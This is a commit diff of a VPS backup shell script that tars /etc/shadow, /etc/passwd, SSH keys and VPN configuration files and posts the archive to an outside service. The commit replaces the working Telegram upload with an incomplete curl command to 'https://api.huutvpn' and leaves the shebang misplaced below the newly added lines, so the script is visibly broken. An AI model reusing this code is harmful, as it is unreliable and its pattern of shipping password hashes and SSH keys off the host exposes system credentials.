1f96675cae68051a369ea3a06c7f38b991d0c9be
huutvpn <143250398+huutvpn@users.noreply.github.com>
2026-02-07 15:46:06 +0700

    Add files via upload

--- backup/backup-telegram.sh
+++ backup/backup-telegram.sh
@@ -1,3 +1,10 @@
+ENV_FILE="/etc/zipvpn/.env"
+if [ ! -f "$ENV_FILE" ]; then
+  echo "Token belum diset. Jalankan install.sh"
+  exit 1
+fi
+export $(grep -v '^#' $ENV_FILE | xargs)
+
 #!/bin/bash
 DATE=$(date +"%Y-%m-%d")
 BACKUP_DIR="/root/backup"
@@ -6,5 +13,5 @@ BOT_TOKEN="ISI_TOKEN_BOT"
 CHAT_ID="ISI_CHAT_ID"
 mkdir -p $BACKUP_DIR
 tar -czf $BACKUP_DIR/$FILE /etc/passwd /etc/group /etc/shadow /etc/gshadow /etc/xray /etc/v2ray /etc/trojan-go /etc/ssh /etc/nginx /etc/systemd/system /etc/limit /etc/huutvpn /var/lib
-curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendDocument -F chat_id=$CHAT_ID -F document=@$BACKUP_DIR/$FILE -F caption="Backup VPS $DATE"
+curl -s -X POST https://api.huutvpn
 rm -f $BACKUP_DIR/$FILE
